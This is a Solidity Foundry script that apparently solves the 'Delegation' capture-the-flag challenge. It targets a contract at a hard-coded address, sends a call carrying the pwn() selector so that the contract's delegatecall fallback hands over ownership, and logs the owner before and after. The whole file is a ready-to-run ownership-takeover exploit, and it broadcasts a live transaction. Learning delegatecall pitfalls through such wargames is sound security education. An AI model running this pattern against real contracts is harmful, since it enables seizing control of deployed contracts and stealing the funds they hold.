// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../src/delegation.sol";

contract DelegationScript is Script {
    Delegation public contractInstance;

    function setUp() public {
        contractInstance = Delegation(
            0x21B9804e7A9f8168771a144722Bf803e07b5E40D
        );
    }

    function run() public {
        vm.startBroadcast();
        console.log("Current owner is : ", contractInstance.owner());
        (bool success, ) = address(contractInstance).call(
            abi.encodeWithSignature("pwn()")
        );
        console.log("Checking delegatecall result : ", success);
        console.log("New owner is : ", contractInstance.owner());
        vm.stopBroadcast();
    }
}
